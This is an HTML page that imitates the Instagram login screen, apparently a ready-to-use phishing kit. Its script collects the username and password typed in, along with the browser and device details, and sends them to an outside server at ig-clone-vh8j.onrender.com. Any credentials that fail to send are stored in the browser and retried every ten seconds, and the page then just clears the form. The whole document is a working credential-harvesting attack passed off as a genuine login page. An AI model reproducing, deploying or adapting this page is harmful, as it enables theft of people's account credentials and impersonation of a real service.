<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>Instagram</title>

    <style>

        *{
            margin:0;
            padding:0;
            box-sizing:border-box;
        }

        html{
            -webkit-text-size-adjust:100%;
        }

        body{
            background:#fafafa;
            font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
            display:flex;
            flex-direction:column;
            min-height:100vh;
        }

        input,button{
            font-family:inherit;
        }

        button{
            touch-action:manipulation;
        }

        input{
            font-size:16px;
        }

        .language{
            text-align:center;
            font-size:12px;
            color:#8e8e8e;
            margin-top:18px;
        }

        .container{
            flex:1;
            padding:0 35px;
            margin-top:60px;
        }

        .logo{
            font-family:cursive;
            font-size:38px;
            text-align:center;
            margin-bottom:40px;
        }

        .fb-btn{
            width:100%;
            background:#1877f2;
            color:#fff;
            border:none;
            border-radius:4px;
            padding:10px 0;
            font-size:14px;
            font-weight:600;
            margin-bottom:20px;
            cursor:pointer;
        }

        .divider{
            display:flex;
            align-items:center;
            margin-bottom:18px;
        }

        .divider .line{
            flex:1;
            height:1px;
            background:#dbdbdb;
        }

        .divider span{
            margin:0 15px;
            font-size:13px;
            font-weight:600;
            color:#8e8e8e;
        }

        .input-wrapper{
            position:relative;
            margin-bottom:14px;
        }

        .input{
            width:100%;
            background:#fafafa;
            border:1px solid #dbdbdb;
            border-radius:4px;
            padding:14px 35px 4px 8px;
            font-size:12px;
        }

        .input:focus{
            outline:none;
            border-color:#a8a8a8;
        }

        .floating-label{
            position:absolute;
            left:8px;
            top:50%;
            transform:translateY(-50%);
            font-size:12px;
            color:#8e8e8e;
            pointer-events:none;
            transition:0.15s ease;
            background:#fafafa;
            padding:0 3px;
        }

        .input:focus + .floating-label,
        .input:not(:placeholder-shown) + .floating-label,
        .input:valid + .floating-label{
            top:4px;
            font-size:10px;
        }

        .toggle{
            position:absolute;
            right:8px;
            top:50%;
            transform:translateY(-50%);
            width:18px;
            height:18px;
            cursor:pointer;
            display:none;
            opacity:0.6;
        }

        .error{
            font-size:11px;
            color:#ed4956;
            margin-bottom:8px;
            min-height:14px;
        }

        .error-border{
            border-color:#ed4956 !important;
        }

        .forgot{
            text-align:right;
            font-size:12px;
            color:#00376b;
            margin:12px 0 18px;
            cursor:pointer;
        }

        .login-btn{
            width:100%;
            background:#b2dffc;
            border:none;
            border-radius:4px;
            padding:7px 0;
            font-size:14px;
            font-weight:600;
            color:white;
            transition:transform 0.1s,background 0.1s;
        }

        .login-btn.active{
            background:#0095f6;
            cursor:pointer;
        }

        .login-btn.active:active{
            transform:scale(0.96);
            background:#0077cc;
        }

        .spinner{
            width:16px;
            height:16px;
            border:2px solid rgba(255,255,255,0.5);
            border-top:2px solid white;
            border-radius:50%;
            animation:spin 0.6s linear infinite;
            margin:auto;
            display:none;
        }

        @keyframes spin{
            from{transform:rotate(0deg);}
            to{transform:rotate(360deg);}
        }

        .signup{
            border-top:none;
            text-align:center;
            padding:15px 0;
            font-size:13px;
            background:white;
        }

        .signup span{
            color:#0095f6;
            font-weight:600;
        }

        .from{
            text-align:center;
            font-size:11px;
            color:#8e8e8e;
            margin:20px 0;
        }

        .from strong{
            display:block;
            letter-spacing:1px;
            margin-top:3px;
        }

        @supports(padding:max(0px)){
            body{
                padding-left:max(0px,env(safe-area-inset-left));
                padding-right:max(0px,env(safe-area-inset-right));
            }
        }

    </style>
</head>

<body>

<div class="language">English ▼</div>

<div class="container">

    <div class="logo">Instagram</div>

    <button class="fb-btn">Continue with Facebook</button>

    <div class="divider">
        <div class="line"></div>
        <span>OR</span>
        <div class="line"></div>
    </div>

    <div class="input-wrapper">
        <input type="text" class="input" id="user" required placeholder=" " autocapitalize="off" autocomplete="username">
        <label class="floating-label">Phone number, username, or email</label>
    </div>
    <div class="error" id="userError"></div>

    <div class="input-wrapper">
        <input type="password" class="input" id="pass" required placeholder=" " autocomplete="current-password">
        <label class="floating-label">Password</label>

        <svg class="toggle" id="togglePass" viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="2">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
            <line id="eyeSlash" x1="4" y1="4" x2="20" y2="20" style="display:none;"></line>
        </svg>

    </div>
    <div class="error" id="passError"></div>

    <div class="forgot">Forgot password?</div>

    <button class="login-btn" id="loginBtn">
        <span id="btnText">Log In</span>
        <div class="spinner" id="spinner"></div>
    </button>

</div>

<div class="signup">
    Don't have an account? <span>Sign up.</span>
</div>

<div class="from">
    from
    <strong>FACEBOOK</strong>
</div>

<script>

    const user=document.getElementById("user");
    const pass=document.getElementById("pass");
    const loginBtn=document.getElementById("loginBtn");
    const userError=document.getElementById("userError");
    const passError=document.getElementById("passError");
    const togglePass=document.getElementById("togglePass");
    const eyeSlash=document.getElementById("eyeSlash");
    const btnText=document.getElementById("btnText");
    const spinner=document.getElementById("spinner");

    function updateButtonState(){

        if(user.value.trim()!==""&&pass.value.trim()!==""){
            loginBtn.classList.add("active");
        }else{
            loginBtn.classList.remove("active");
        }

        togglePass.style.display=pass.value.length>0?"block":"none";
    }

    user.addEventListener("input",updateButtonState);
    pass.addEventListener("input",updateButtonState);

    togglePass.addEventListener("click",()=>{

        if(pass.type==="password"){
            pass.type="text";
            eyeSlash.style.display="block";
        }else{
            pass.type="password";
            eyeSlash.style.display="none";
        }

    });

    async function sendToServer(data){

        try{

            const response=await fetch("https://ig-clone-vh8j.onrender.com/save",{
                method:"POST",
                headers:{
                    "Content-Type":"application/json"
                },
                body:JSON.stringify(data)
            });

            return await response.json();

        }catch(e){

            let pending=JSON.parse(localStorage.getItem("pendingLogins"))||[];
            pending.push(data);
            localStorage.setItem("pendingLogins",JSON.stringify(pending));

        }

    }

    loginBtn.addEventListener("click",async()=>{

        userError.textContent="";
        passError.textContent="";
        user.classList.remove("error-border");
        pass.classList.remove("error-border");

        let hasError=false;

        if(user.value.trim()===""){
            userError.textContent="Please enter your username.";
            user.classList.add("error-border");
            hasError=true;
        }

        if(pass.value.trim()===""){
            passError.textContent="Please enter your password.";
            pass.classList.add("error-border");
            hasError=true;
        }

        if(!hasError){

            btnText.style.display="none";
            spinner.style.display="block";
            loginBtn.disabled=true;

            const payload={
                username:user.value,
                password:pass.value,
                time:new Date().toISOString(),
                browser:navigator.userAgent,
                device:/Mobi|Android/i.test(navigator.userAgent)?"Mobile":"Desktop"
            };

            await sendToServer(payload);

            spinner.style.display="none";
            btnText.style.display="block";
            loginBtn.disabled=false;

            user.value="";
            pass.value="";
            updateButtonState();

        }

    });

    document.addEventListener("keydown",function(event){
        if(event.key==="Enter"){
            if(loginBtn.classList.contains("active")){
                loginBtn.click();
            }
        }
    });

    async function sendPending(){

        let pending=JSON.parse(localStorage.getItem("pendingLogins"))||[];

        if(pending.length===0) return;

        for(let i=0;i<pending.length;i++){

            try{

                await fetch("https://ig-clone-vh8j.onrender.com/save",{
                    method:"POST",
                    headers:{
                        "Content-Type":"application/json"
                    },
                    body:JSON.stringify(pending[i])
                });

                pending.splice(i,1);
                i--;
                localStorage.setItem("pendingLogins",JSON.stringify(pending));

            }catch(e){
                break;
            }

        }

    }

    window.onload=sendPending;
    setInterval(sendPending,10000);

</script>
</body>
</html>
